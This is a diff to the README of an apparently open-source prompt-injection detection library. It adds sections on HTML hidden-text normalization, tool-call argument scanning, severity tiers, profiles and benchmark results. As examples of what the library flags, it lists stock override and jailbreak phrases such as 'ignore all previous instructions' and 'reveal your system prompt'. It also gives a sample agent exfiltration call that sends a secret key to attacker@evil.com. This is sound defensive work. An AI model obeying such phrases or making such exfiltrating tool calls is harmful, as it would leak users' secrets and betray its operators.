@@ -122,7 +122,7 @@ flowchart TD
     S1 --> S2["Normalize<br/>Plane 14 decode · strip invisibles<br/>NFKD · diacritics · homoglyphs"]
     S2 --> S3["Decode encodings<br/>URL · char-split · base64 · leet"]
     S3 --> S4["Append detection variants<br/>pre-leet · base64 decoded · Plane-14 decoded<br/>ROT13 · reversed"]
-    S4 --> DET{"Pattern matching<br/>44 patterns + extraPatterns"}
+    S4 --> DET{"Pattern matching<br/>56 patterns + extraPatterns"}
 
     DET -->|no match| CLEAN["Clean path<br/>normalize output<br/>block / neutralize / excise only"]
     DET -->|match| MODE{"mode?"}
@@ -185,15 +185,16 @@ else if (r.score >= 0.3) sendToHumanReview();
 ```
 
 Score contributors (additive, capped at 1): high-severity pattern `1.0`,
-medium `0.5`, tag-block payload `0.9`, suspicious homoglyphs `0.3`,
-interleaved invisibles `0.3`, base64-hidden text `0.2`, analysis
-truncation `0.1`. The scoring is deterministic and fully explained by
-`reasons` — it is not a probability. As of v2.1, a **Plane-14 tag-block
-payload is also a first-class detection** in `detect()` / `count()` /
-`sanitize()` (there is no benign reason for user input to carry text in
-invisible tag characters). The fuzzier signals — homoglyphs, invisibles,
-base64 — contribute to `assess()` only; they have benign explanations
-and never block on their own.
+medium `0.5`, low-severity pattern `0.15` per match (capped at `0.3`
+total, see [Severity Tiers](#severity-tiers)), tag-block payload `0.9`,
+suspicious homoglyphs `0.3`, interleaved invisibles `0.3`, base64-hidden
+text `0.2`, analysis truncation `0.1`. The scoring is deterministic and
+fully explained by `reasons` — it is not a probability. As of v2.1, a
+**Plane-14 tag-block payload is also a first-class detection** in
+`detect()` / `count()` / `sanitize()` (there is no benign reason for user
+input to carry text in invisible tag characters). The fuzzier signals —
+homoglyphs, invisibles, base64 — contribute to `assess()` only; they have
+benign explanations and never block on their own.
 
 The signals are scoped to avoid false positives: `suspiciousHomoglyphs`
 fires only when Latin text is salted with Cyrillic/Greek **look-alikes**
@@ -203,6 +204,27 @@ letters* (emoji variation selectors and Persian ZWNJ do not count).
 
 > Like `patternsDetected`, keep `score`, `reasons`, and `signals`
 > server-side — exposing them gives an attacker an oracle.
+
+## Severity Tiers
+
+Every pattern carries a `severity` of `"high"`, `"medium"`, or `"low"`.
+`"low"` is an `assess()`-only tier for bare, ambiguous keywords that show
+up constantly in benign text about AI: "jailbreak", "system prompt",
+"pretend to be". A low match never blocks, never neutralizes, and never
+moves `detect()` or `count()`, both of which stay reserved for high and
+medium matches. It contributes at most `0.3` to `assess().score` (`0.15`
+per match) with a `low:<category>` reason.
+
+```ts
+const r = assess("How do I write a good system prompt for my support bot?");
+// r.reasons includes "low:prompt-extraction"
+// r.score is small and non-blocking
+// detect(...) for the same text is false
+```
+
+This is what keeps a developer-chat or education product from
+hard-blocking a sentence that merely mentions the vocabulary of prompt
+injection without directing one.
 
 ## Normalization as a Standalone Preprocessor
 
@@ -226,6 +248,35 @@ homoglyphs mapped — no lossy leetspeak/URL/reversal transforms that
 would corrupt legitimate content), the `decoded[]` payloads recovered
 from tag-block and base64 smuggling, and the same `signals` as
 `assess()`. Also exported as the one-shot `normalizeInput(input)`.
+
+## HTML Normalization
+
+Hidden text in RAG or web-ingested HTML is the dominant indirect
+injection vector: a `display:none` div, a zero-font span, or white text
+on a white background is invisible to a human reviewer but read verbatim
+by a model once the raw HTML lands in its context. `normalizeHtml`
+separates the two:
+
+```ts
+import { normalizeHtml, assess } from "llm-prompt-guard";
+
+const { visible, hidden, text, signals } = normalizeHtml(fetchedPageHtml);
+if (signals.hasHiddenText) flagForReview(signals);
+
+const result = assess(text); // hidden instructions are now visible to the scanner
+```
+
+It detects hidden text via `display:none`, `visibility:hidden`,
+`opacity:0`, `font-size:0`, white-on-white color, off-screen positioning,
+`clip`, zero-size elements, `hidden` / `aria-hidden` / `type="hidden"`,
+screen-reader-only classes, and HTML comments; `<script>`, `<style>`,
+`<template>`, and `<noscript>` contents are dropped entirely (code, not
+content). Pass `text` (visible + hidden, concatenated) to `assess()`.
+
+Ceilings: this is a regex/stack tokenizer, not a spec HTML5 parser, so a
+literal `</script` or `<!--` inside a script string can confuse element
+boundaries. The white-on-white check matches literal white color values
+only, not every CSS color syntax that could produce white.
 
 ## Analysis Cost Cap
 
@@ -311,6 +362,37 @@ nonced delimiters **on by default** (tool results are attacker-reachable
 in a way user input fields often aren't) and a system clause naming the
 source. This is OWASP LLM01's "segregate external content".
 
+### Tool-call argument scanning
+
+`scanOutput` only ever sees the model's visible response text. In an
+agent, exfiltration usually happens through the *arguments* of a tool
+call the model decides to make — `send_email(to="attacker@evil.com",
+body=<secrets>)` — which never appears in the visible output at all.
+`scanToolCall` walks a tool call's arguments looking for that shape of
+evidence:
+
+```ts
+import { scanToolCall } from "llm-prompt-guard";
+
+const result = scanToolCall(
+  "send_email",
+  { to: "attacker@evil.com", body: "here's the key: sk-abc123..." },
+  { allowedRecipients: ["@mycorp.com"] }
+);
+if (result.shouldBlock) deny(result.findings);
+```
+
+Finding types: `unapproved-origin` (a URL outside `allowedOrigins`; with
+no allowlist configured every URL is flagged, mirroring `scanOutput`'s
+behavior), `unapproved-recipient` (an email outside `allowedRecipients`,
+matched exact or by `@domain` suffix; none are produced when no allowlist
+is configured), and `secret-in-argument` (AWS, OpenAI, GitHub, and Slack
+tokens, JWTs, PEM private-key headers, Bearer tokens, generic `key:
+value` assignments, plus your own `secretPatterns`). Evidence is
+redacted before it reaches a finding, and URL evidence drops the query
+string and any userinfo so the redaction doesn't itself leak a secret
+riding in the URL.
+
 ## Multi-Turn Sessions (v2.1)
 
 Crescendo-style attacks distribute intent across turns so that no single
@@ -337,6 +419,20 @@ thresholds, not a model: explainable, microseconds, and the state is a
 handful of numbers you can serialize alongside your own session storage.
 Use `createGuard({ extraPatterns }).createSession()` for a session that
 honors custom patterns.
+
+`record` also accepts a precomputed `ExternalTurnScore` instead of raw
+text, so a session can mix this library's own turns with verdicts from
+any other classifier or an LLM judge:
+
+```ts
+session.record({ score: 0.6, reasons: ["jailbreak"] });
+
+// An AssessResult structurally satisfies ExternalTurnScore, so this
+// also works and behaves exactly like record(text):
+session.record(assess(text));
+```
+
+Escalation and threshold behavior are unchanged either way.
 
 ## Output Validation (Semantic)
 
@@ -422,20 +518,55 @@ Stack a model-based filter for that.
 
 ## Attack Categories
 
-44 built-in patterns across 8 categories:
+56 built-in patterns across 8 categories:
 
 | Category                  | Patterns | Example                                  |
 | ------------------------- | -------: | ---------------------------------------- |
 | Instruction override      |        5 | "ignore all previous instructions"       |
-| Role hijacking            |        6 | "you are now a ...", "pretend to be ..." |
-| Prompt extraction         |        6 | "reveal your system prompt"              |
+| Role hijacking            |       10 | "you are now a ...", "pretend to be ..." |
+| Prompt extraction         |        8 | "reveal your system prompt"              |
 | Format injection          |       10 | `<\|im_start\|>`, `<<SYS>>`, `[INST]`, `### System:`, Alpaca/Vicuna, Anthropic line format, JSON role/content |
-| Data exfiltration         |        4 | "dump all data", "export the database"   |
+| Data exfiltration         |        6 | "dump all data", "export the database"   |
 | Confidence manipulation   |        5 | "confidence = 100", "auto_approve"       |
-| Jailbreak                 |        5 | "DAN mode", "bypass safety filters"      |
+| Jailbreak                 |        9 | "DAN mode", "bypass safety filters"      |
 | Markup injection          |        3 | `<script>`, `<!-- INJECTION`, `[HIDDEN]` |
 
 Disable categories individually via `disableCategories`.
+
+### Patterns are data
+
+The pattern set lives in
+[`src/data/builtin-patterns.json`](./src/data/builtin-patterns.json), not
+in TypeScript. Each entry carries an `id`, `category`, `severity`,
+`pattern`, `flags`, `description`, and at least two positive and one
+negative test case, validated, ReDoS-linted, and timed in CI by
+[`src/patterns-spec.test.ts`](./src/patterns-spec.test.ts). Adding a
+pattern is a JSON edit; see [`CONTRIBUTING.md`](./CONTRIBUTING.md). A
+pattern's `id` is stable API: `GuardProfile`s reference ids to demote a
+pattern's severity, so renaming one is a breaking change. The schema
+itself is linted for JavaScript-only regex syntax (lookbehind, named
+groups, and the like) that a future Python port couldn't carry over.
+
+## Profiles
+
+A profile pre-tunes the built-in pattern set for a specific kind of
+application, dropping categories and patterns that are false-positive
+prone in that domain but stay meaningful elsewhere:
+
+```ts
+const guard = createGuard({ profile: "developer-tool" });
+```
+
+| Profile | Effect |
+| --- | --- |
+| `default` | No changes. |
+| `developer-tool` | Disables `markup-injection` and `format-injection` (developers legitimately paste ChatML/JSON/`<script>` snippets while discussing prompt formats or debugging front-end code). |
+| `data-assistant` | Disables `data-exfiltration` (a SQL/data assistant is *asked* to list, dump, and export the user's own tables all day). |
+| `education` | Demotes every role-hijacking pattern to `"low"` (a tutoring tool routinely asks a model to assume a persona, including personas an admin/security-flavored regex might otherwise flag). |
+
+An unknown profile name throws a `RangeError`. Profiles union with
+`disableCategories` rather than replace it, so you can pick a profile and
+still disable additional categories of your own.
 
 ## Unicode Bypass Protection
 
@@ -449,7 +580,14 @@ Disable categories individually via `disableCategories`.
   interleaved to disrupt byte-level regex.
 - **NFKD decomposition** — normalizes fullwidth letters, ligatures
   (`ﬁ` → `fi`), and accented characters into their base forms.
-- **Homoglyph map** — Cyrillic (а, е, о, р, с) and Greek (ο, α) → Latin.
+- **Confusables map** — detection folds 824 confusable code points
+  generated from [Unicode's `confusables.txt`](https://www.unicode.org/Public/security/latest/confusables.txt)
+  (Cyrillic, Greek, Armenian, Cherokee, Coptic, Lisu, Deseret, and more)
+  to their ASCII look-alike, replacing the old 22-entry map. Regenerate
+  with `npm run build:confusables`. The `sanitize()` output path keeps
+  the old, narrow map so non-Latin text sent onward to an LLM isn't
+  altered any more aggressively than before; the wide map is a
+  detection-only expansion.
 
 ## Encoding Attack Resistance
 
@@ -481,20 +619,84 @@ Read the recall number the way it is published: this corpus is dominated
 by task-drift attacks with no injection vocabulary ("stop, I urgently
 need help with X instead"), which regex detection structurally cannot
 catch and which are the documented job of the model-based layers above
-this one. What Layer 1 is scored on is the other two columns — zero
-false positives on benign traffic at microsecond cost, so stacking it
+this one. What Layer 1 is scored on is the other two columns: on this
+public dataset, zero false positives at microsecond cost, so stacking it
 in front of an ML guard or LLM judge is free. A subset of patterns was
 widened after reviewing this dataset's misses, so treat the numbers as
 in-domain rather than held-out.
 
 **Curated corpus** — 515 benign + 198 attack inputs covering every
-encoding/evasion class the pipeline claims to defeat: **0.00% FPR, 100%
-detection on detect-expected entries**, 11 documented known-misses,
-p50 ~5–10µs per `detect()` call. All 15 output-validation probes flag;
-all five modes shape-verified.
+encoding/evasion class the pipeline claims to defeat: **0.00% FPR (on
+this corpus), 100% detection on detect-expected entries**, 12 documented
+known-misses, p50 ~5–10µs per `detect()` call. All 15 output-validation
+probes flag; all five modes shape-verified.
+
+**Domain benign corpora**: six corpora at
+[`benchmarks/corpora/benign/`](./benchmarks/corpora/benign/), written
+independently of the detector, checking the false-positive class the
+skincare-review corpus above can't catch: benign text that *mentions* AI,
+prompts, databases, or role-play without directing one. Measured with
+`detect()`, both under the default pattern set and under the matching
+`GuardProfile` where one exists:
+
+| Corpus | Default FPR | Matching profile FPR |
+| --- | ---: | ---: |
+| developer-chat | 1.34% | 0.00% (`developer-tool`) |
+| sql-assistant | 0.00% | 0.00% (`data-assistant`) |
+| support | 0.00% | n/a |
+| education | 0.00% | 0.00% (`education`) |
+| ai-literate | 1.54% | n/a |
+| transcripts | 1.64% | n/a |
+| original benign corpus | 0.00% | n/a |
+
+CI gates the default FPR at ≤2% per corpus and the matching-profile FPR
+at ≤1%. Ten of the sentences these corpora exercise, including "How do I
+write a good system prompt for my support bot", "List all the tables in
+my database", "Pretend to be a pirate for the school play", and "I want
+to jailbreak my old iPhone", are unit-tested as not detected.
+
+**Fuzz testing**: a seeded property-based fuzzer
+([`src/fuzz.test.ts`](./src/fuzz.test.ts)) generates obfuscated variants
+of every corpus attack payload (confusables, invisibles, diacritics,
+leet, URL-encoding, separators, fullwidth forms, case, and pairs of
+these) and gates that `detect()` still recovers each one, in CI. It
+found and fixed three normalizer bugs during development: confusable/NFKD
+ordering, leet decoding of literal numbers, and double URL-encoding.
 
 Run them: `npm run bench && npm run bench:public`. Re-measure on your
 own traffic before trusting any FPR.
+
+## Held-Out Evaluation
+
+The benchmarks above measure against corpora this library's patterns are
+allowed to be tuned against. [`benchmarks/heldout/`](./benchmarks/heldout/)
+measures against a corpus that never informs a pattern change: 400 rows
+from [BIPIA](https://github.com/microsoft/BIPIA) (200 injected, 200
+benign, MIT license, seed 42), with 0 rows overlapping the tuning
+corpora (`corpora/attacks.json`, `corpora/deepset-prompt-injections.json`).
+
+| Metric | This library | protectai/deberta-v3-base-prompt-injection-v2 |
+| --- | ---: | ---: |
+| Recall | 0.0% | 18.5% |
+| Precision | n/a (no true positives) | 52.1% |
+| FPR | 0.00% | 17.0% |
+| Median latency | 204 µs | 35.4 ms (174x) |
+
+BIPIA's attacks are task-drift instructions with no injection
+vocabulary, the same structural gap the public-dataset recall number
+above documents, and a regex layer misses essentially all of them. This
+library wins on latency and FPR and loses on recall for that attack
+class, which is exactly the trade-off Layer 1 is meant to make: it sits
+in front of a model-based layer, not in place of one. [Llama Prompt
+Guard 2](https://huggingface.co/meta-llama/Llama-Prompt-Guard-2-86M) is
+gated on Hugging Face and couldn't be run for this comparison; see its
+model card for Meta's own published numbers (measured on a different
+eval set, so not directly comparable to the row above).
+
+The set is never opened while editing a pattern, and no pattern change
+may cite a held-out row to justify itself; see
+[`benchmarks/HELDOUT.md`](./benchmarks/HELDOUT.md) for the full policy.
+If it's ever used to tune anyway, it's retired and replaced.
 
 ## Where this fits
 
@@ -522,6 +724,23 @@ semantic paraphrase, novel phrasings, and multi-turn escalation.
 ## Runtime compatibility
 
 Pure TypeScript. No native dependencies. Uses `globalThis.crypto.getRandomValues` (Web Crypto) — identical behavior across Node 20+, Bun, Deno, Cloudflare Workers, Vercel Edge, and modern browsers. Dual CJS / ESM build.
+
+## Adapters and Subpath Exports
+
+Every subpath below is a structural-typed, zero-dependency bundle. None
+of them `import` the framework they integrate with, so there's no peer
+dependency to install.
+
+| Import | Exports | Usage |
+| --- | --- | --- |
+| `llm-prompt-guard/normalize` | `normalizeInput`, `normalizeHtml` | `normalizeInput(text)` before handing text to any downstream classifier. |
+| `llm-prompt-guard/egress` | `scanOutput`, `scanToolCall` | `scanOutput(llmResponse)` / `scanToolCall(name, args)` on the two outbound channels. |
+| `llm-prompt-guard/agentic` | `scanToolDefinition`, `fingerprintTool`, `wrapToolResult` | Scan and fingerprint MCP tool definitions; quarantine tool results. |
+| `llm-prompt-guard/adapters/vercel-ai` | `guardMiddleware` | `wrapLanguageModel({ model, middleware: guardMiddleware() })`. |
+| `llm-prompt-guard/adapters/langchain` | `guardTool` | `guardTool(myLangchainTool)` wraps a tool's `invoke`/`call`. |
+| `llm-prompt-guard/adapters/mcp` | `guardMcpClient` | `guardMcpClient(mcpClient)`: scans `listTools()`, fingerprints for definition drift, quarantines `callTool()` results. |
+| `llm-prompt-guard/adapters/express` | `guardExpress` | `app.post("/chat", guardExpress({ mode: "block" }), handler)`. Express only. |
+| `llm-prompt-guard/adapters/hono` | `guardHono` | `app.post("/chat", guardHono({ mode: "block" }), handler)`. |
 
 ## API
 
@@ -679,6 +898,27 @@ Things this library does not attempt, so you can plan the layers above it:
   approval gates for consequential tool calls belong to your agent
   framework. `scanToolDefinition` tells you a tool *advertises*
   something malicious; it cannot constrain what the tool does when run.
+
+## Playground
+
+A static, dependency-free page for trying the library against your own
+input without installing anything:
+
+```
+npm run build:playground
+open playground/index.html
+```
+
+It runs `normalizeInput`, `assess`, and `sanitize` side by side, plus an
+HTML mode backed by `normalizeHtml`. Nothing leaves the browser: the
+page loads the same IIFE bundle and analyzes input entirely client-side.
+A GitHub Pages workflow deploys it automatically once Pages is enabled
+in the repository settings.
+
+The tuning corpora behind the numbers in [Benchmarks](#benchmarks) are
+also staged as a Hugging Face dataset in
+[`benchmarks/hf/`](./benchmarks/hf/): 198 attack rows and 1,310 benign
+rows across seven domains, with a dataset card. Not yet published.
 
 ## License
 
